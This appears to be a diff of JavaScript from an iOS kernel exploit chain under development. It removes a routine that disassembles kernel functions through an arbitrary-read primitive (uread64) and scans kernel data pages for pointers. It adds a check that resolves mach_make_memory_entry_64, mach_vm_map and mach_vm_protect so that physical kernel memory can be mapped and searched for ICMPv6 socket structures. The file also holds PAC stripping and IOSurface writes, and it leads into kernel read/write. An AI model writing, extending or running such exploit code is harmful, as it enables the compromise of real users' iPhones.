@@ -7122,124 +7122,23 @@
     uwrite64(surface_address + 0xF848n, springboard_pid);
     if (springboard_pid != 0n) LOG(`[MPD] SpringBoard PID=${springboard_pid} stored at IOSurface +0xF848`);
 
-    // ===== M5: GPU kernel data reader via code disassembly =====
-    // Helper: disassemble kernel function, find ADRP targets, return data addresses
-    function gpu_disasm_and_read(name, func_addr, num_instrs) {
-      let words = [];
-      for (let i = 0n; i < BigInt(num_instrs); i++) {
-        let addr = func_addr + i * 4n;
-        let instr = 0xBADBADBAn;
-        try {
-          let aligned = addr & ~7n;
-          let val64 = uread64(aligned);
-          let shift = (addr - aligned) * 8n;
-          instr = Number((val64 >> shift) & 0xFFFFFFFFn);
-        } catch(e) { instr = 0xDEADDEADn; }
-        words.push(instr >>> 0);
-      }
-      // Log hex dump in rows of 8
-      for (let row = 0; row < (num_instrs + 7) >> 3; row++) {
-        let line = "";
-        for (let col = 0; col < 8; col++) {
-          let idx = row * 8 + col;
-          if (idx >= num_instrs) break;
-          line += "0x" + words[idx].toString(16).padStart(8, '0') + " ";
-        }
-        LOG(`[M5] ${name}[${row*8}-${Math.min(row*8+7, num_instrs-1)}]: ${line}`);
-      }
-      // Find ADRP+ADD pairs and read data
-      let results = [];
-      for (let i = 0; i < num_instrs; i++) {
-        let instr = words[i];
-        if (instr == 0xBADBADBA || instr == 0xDEADDEAD) continue;
-        if (((instr & 0x9F000000) >>> 0) == 0x90000000) {
-          let immlo = (instr >>> 29) & 0x3;
-          let immhi = (instr >>> 5) & 0x7FFFF;
-          let imm21 = (immhi << 2) | immlo;
-          if (imm21 & (1 << 20)) imm21 = imm21 - (1 << 21);
-          let rd = instr & 0x1F;
-          let target_page = (func_addr + BigInt(i * 4) + BigInt(imm21) * 4096n) & ~0xFFFn;
-          LOG(`[M5] ${name} ADRP +${i*4}: x${rd} imm=0x${(imm21>>>0).toString(16)} page=${target_page.hex()}`);
-          // Look for ADD to same register in next instruction
-          let add_offset = 0;
-          if (i + 1 < num_instrs) {
-            let ni = words[i + 1];
-            if (((ni >>> 24) & 0xFF) == 0x91 && (ni & (1 << 21)) == 0) {
-              if ((ni & 0x1F) == rd && ((ni >> 5) & 0x1F) == rd) {
-                add_offset = (ni >>> 10) & 0xFFF;
-              }
-            }
-          }
-          let full_addr = target_page + BigInt(add_offset);
-          let val = 0n;
-          try { val = uread64(full_addr); } catch(e) {}
-          LOG(`[M5]   data@${full_addr.hex()}: ${val.hex()}`);
-          results.push({rd, target_page, add_offset, full_addr, val});
-        }
-      }
-      return results;
-    }
-
-    // Disassemble proc_name and task_for_pid
-    let pn_results = gpu_disasm_and_read("proc_name", proc_name_raw.noPAC(), 32);
-    if (proc_listpids_raw != 0n) {
-      let pl_results = gpu_disasm_and_read("proc_listpids", proc_listpids_raw.noPAC(), 40);
-    }
-
-    // Scan the data page found by proc_name ADRP for pointer-looking values
-    // The page at 0x1ee8a6000 contains kernel data globals
-    LOG("[M5] Scanning kernel data page (summary)...");
-    let scan_page = 0x1ee8a6000n;
-    let kv_ptrs = [];
-    let kc_ptrs = [];
-    for (let off = 0n; off < 0x1000n; off += 8n) {
-      let addr = scan_page + off;
-      let v = 0n;
-      try { v = uread64(addr); } catch(e) {}
-      if (v == 0n || v == 0xffffffffffffffffn) continue;
-      // Classify pointers
-      if (v > 0xfffffff000000000n) { kv_ptrs.push({off, addr: v}); }
-      else if (v > 0x1000000000000n && v < 0x2000000000000n && (v & 0xFFFn) == 0n) { kc_ptrs.push({off, addr: v}); }
-      else if (v > 0x1000000000n && v < 0x3000000000n) { /* likely userspace, skip */ }
-    }
-    LOG(`[M5] Found ${kv_ptrs.length} KV ptrs, ${kc_ptrs.length} KC-aligned ptrs`);
-    for (let p of kv_ptrs) LOG(`[M5]   KV: +${p.off.toString(16).padStart(4,'0')} -> ${p.addr.hex()}`);
-    for (let p of kc_ptrs.slice(0, 10)) LOG(`[M5]   KC: +${p.off.toString(16).padStart(4,'0')} -> ${p.addr.hex()}`);
-
-    // GPU kernel read helpers
-    function gpu_kread8(addr) {
-      try {
-        let aligned = addr & ~7n;
-        let val64 = uread64(aligned);
-        let shift = (addr - aligned) * 8n;
-        return Number((val64 >> shift) & 0xFFn);
-      } catch(e) { return 0; }
-    }
-    function gpu_kread64(addr) {
-      try { return uread64(addr); } catch(e) { return 0n; }
-    }
-
-    // Follow the BL at proc_name[31] = 0x9400006b
-    // Target = proc_name + 31*4 + 0x6B*4 = proc_name + 0x7C + 0x1AC = proc_name + 0x228
-    let pn_addr = proc_name_raw.noPAC();
-    let bl_target = pn_addr + 0x228n;
-    LOG(`[M5] proc_name BL@31 target = ${bl_target.hex()}`);
-    let bl_results = gpu_disasm_and_read("proc_name_callee", bl_target, 64);
-    // Check for unique ADRP pages
-    let seen_pages = new Set();
-    for (let r of bl_results) {
-      let page_str = r.target_page.toString();
-      if (!seen_pages.has(page_str)) {
-        seen_pages.add(page_str);
-        // Dump the first 64 bytes of this page to see what's there
-        LOG(`[M5] New data page: ${r.target_page.hex()} (from ADRP at +${r.i*4})`);
-        for (let off = 0n; off < 64n; off += 8n) {
-          let v = gpu_kread64(r.target_page + off);
-          if (v != 0n && v != 0xffffffffffffffffn) {
-            LOG(`[M5]   +0x${off.toString(16)}: ${v.hex()}`);
-          }
-        }
-      }
+    // ===== M5: Try original approach — mach_make_memory_entry_64 for physical memory =====
+    // The original exploit uses mach_make_memory_entry_64 to map physical kernel memory
+    // into userspace, then scans for ICMPv6 pcb structures via OOB read.
+    // Let's check if MPD can call this function.
+    LOG("[M5] Testing mach_make_memory_entry_64 approach...");
+    let mmme_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_make_memory_entry_64");
+    LOG(`[M5] gpuDlsym(mach_make_memory_entry_64) = ${mmme_sym.hex()}`);
+    if (mmme_sym.noPAC() != 0n) {
+      LOG("[M5] mach_make_memory_entry_64 available! MPD can create physical memory mappings.");
+      // Also check for the other required functions
+      let vm_map_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_map");
+      LOG(`[M5] gpuDlsym(mach_vm_map) = ${vm_map_sym.hex()}`);
+      let vm_prot_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_protect");
+      LOG(`[M5] gpuDlsym(mach_vm_protect) = ${vm_prot_sym.hex()}`);
+      LOG("[M5] Physical memory mapping path available — can implement pcb scan!");
+    } else {
+      LOG("[M5] mach_make_memory_entry_64 NOT available — need alternative approach");
     }
 
     // ===== M5: Kernel Read/Write via ICMPv6 socket (mpd_fcall) =====
